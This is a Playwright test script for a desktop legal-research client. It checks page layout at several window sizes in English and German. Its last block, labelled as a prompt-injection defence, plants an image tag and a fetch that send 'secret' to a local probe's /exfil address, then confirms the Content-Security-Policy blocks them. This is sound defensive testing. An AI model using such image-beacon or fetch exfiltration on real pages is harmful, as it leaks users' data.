// Layout regression check for the desktop client (UI audit 2026-10-30):
// at 1366×768, 1024×768 and 800×900, English and German, the page never
// scrolls sideways, the last sidebar entry is reachable, the question field
// is at least 320 px wide, the window cannot be shifted up by script, and
// Settings, More tools and Help fit. Needs a built client (npm run build) and
// the engine's dependencies (sidecar: npm ci). Exits 1 on a failure.
//   node e2e/layout-check.mjs
import { createRequire } from 'node:module'
import path from 'node:path'
import http from 'node:http'
import { startStack, BRIDGE, WEB_PORT, ROOT } from './stack.mjs'

const require = createRequire(path.join(ROOT, 'sidecar', 'package.json'))
const { chromium } = require('playwright-core')
const SIZES = [[1366, 768], [1024, 768], [800, 900]]
const failures = []
const fail = (where, what) => { failures.push(`${where}: ${what}`); console.log(`✗ ${where}: ${what}`) }

const st = await startStack()
const browser = await chromium.launch(process.env.CHROMIUM_PATH ? { executablePath: process.env.CHROMIUM_PATH } : {})
try {
  for (const lang of ['en', 'de']) {
    const ctx = await browser.newContext({ viewport: { width: SIZES[0][0], height: SIZES[0][1] } })
    await ctx.addInitScript(BRIDGE(st.ids.a))
    await ctx.addInitScript(`try { localStorage.setItem('lexvault-ui-lang', '${lang}'); localStorage.setItem('theme', 'light') } catch {}`)
    const page = await ctx.newPage()
    const errors = []
    page.on('pageerror', (e) => errors.push(e.message))
    // The Content-Security-Policy must not block anything the app itself needs.
    page.on('console', (m) => { if (/Content Security Policy/i.test(m.text())) errors.push(`CSP: ${m.text()}`) })
    await page.goto(`http://127.0.0.1:${WEB_PORT}/research`)
    await page.waitForSelector('[data-testid=question]', { timeout: 30000 })
    await page.waitForTimeout(800)
    for (const [w, h] of SIZES) {
      const where = `${lang} ${w}×${h}`
      await page.setViewportSize({ width: w, height: h })
      await page.waitForTimeout(400)
      const r = await page.evaluate(() => {
        const d = document.documentElement
        const side = document.querySelector('[data-testid=app-sidebar]')
        const links = side ? [...side.querySelectorAll('a, button')].filter((x) => x.getBoundingClientRect().height > 0) : []
        const last = links[links.length - 1]
        let lastOk = false
        if (last) {
          last.scrollIntoView({ block: 'nearest' })
          const b = last.getBoundingClientRect()
          const hit = document.elementFromPoint(b.left + b.width / 2, b.top + b.height / 2)
          lastOk = b.bottom <= innerHeight + 1 && !!hit && (hit === last || last.contains(hit))
        }
        const q = document.querySelector('[data-testid=question]')
        // Anything that scrolls into view must not shift the whole window up.
        document.querySelector('[data-testid=composer]')?.scrollIntoView({ block: 'end' })
        const shifted = [...document.querySelectorAll('#root, #root > div, #root > div > div')].some((e) => e.scrollTop > 0) || window.scrollY > 0
        return { hScroll: d.scrollWidth > innerWidth + 1, lastOk, lastLabel: last?.textContent?.trim() || '', q: q ? Math.round(q.getBoundingClientRect().width) : 0, shifted }
      })
      if (r.hScroll) fail(where, 'the chat page scrolls sideways')
      if (!r.lastOk) fail(where, `the last sidebar entry (${r.lastLabel}) is not reachable`)
      if (r.q < 320) fail(where, `the question field is ${r.q} px wide (< 320)`)
      if (r.shifted) fail(where, 'the window shifted up after scrollIntoView')
      for (const route of ['/settings', '/more', '/help', '/matters']) {
        await page.evaluate((to) => { history.pushState({}, '', to); dispatchEvent(new PopStateEvent('popstate')) }, route)
        await page.waitForTimeout(500)
        const hs = await page.evaluate(() => document.documentElement.scrollWidth > innerWidth + 1 || [...document.querySelectorAll('main *')].some((e) => e.scrollWidth > e.clientWidth + 8 && /auto|scroll/.test(getComputedStyle(e).overflowX) && e.tagName !== 'TEXTAREA' && !e.classList.contains('table-wrap')))
        if (hs) fail(`${where} ${route}`, 'scrolls sideways')
      }
      await page.evaluate(() => { history.pushState({}, '', '/research'); dispatchEvent(new PopStateEvent('popstate')) })
      await page.waitForSelector('[data-testid=question]', { timeout: 10000 })
      if (!failures.some((f) => f.startsWith(where))) console.log(`✓ ${where}: no sideways scroll, last sidebar entry reachable, question field ${r.q} px`)
    }
    if (errors.length) fail(lang, `page errors: ${errors.join(' | ')}`)
    await ctx.close()
  }
  // Prompt injection: an answer must never make the page load a remote
  // address. The policy blocks an <img> to another site even if one slipped
  // into the page; the probe below must never reach the server.
  {
    let hits = 0
    const probe = http.createServer((_req, res) => { hits++; res.writeHead(200, { 'Content-Type': 'image/gif' }); res.end() })
    await new Promise((r) => probe.listen(0, '127.0.0.1', r))
    const ctx = await browser.newContext()
    await ctx.addInitScript(BRIDGE(st.ids.a))
    const page = await ctx.newPage()
    await page.goto(`http://127.0.0.1:${WEB_PORT}/research`)
    await page.waitForSelector('[data-testid=question]', { timeout: 30000 })
    const r = await page.evaluate(async (port) => {
      const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]')
      let violated = false
      document.addEventListener('securitypolicyviolation', () => { violated = true })
      const img = document.createElement('img')
      img.src = `http://localhost:${port}/exfil?d=secret`
      document.body.appendChild(img)
      let fetched = true
      try { await fetch(`http://localhost:${port}/exfil2?d=secret`) } catch { fetched = false }
      await new Promise((ok) => setTimeout(ok, 500))
      return { meta: meta?.getAttribute('content') || '', violated, fetched }
    }, probe.address().port)
    if (!/img-src 'self'/.test(r.meta)) fail('csp', 'the built page has no Content-Security-Policy with img-src')
    if (!r.violated) fail('csp', 'a remote image was not reported as blocked')
    if (r.fetched) fail('csp', 'a request to another address was not blocked')
    if (hits) fail('csp', `the remote probe was contacted ${hits} time(s)`)
    if (!failures.some((f) => f.startsWith('csp'))) console.log('✓ Content-Security-Policy: remote image and request blocked')
    await ctx.close()
    probe.close()
  }
} finally {
  await browser.close()
  st.stop()
}
if (failures.length) { console.log(`\n${failures.length} layout problem(s).`); process.exit(1) }
console.log('\nLayout check passed.')
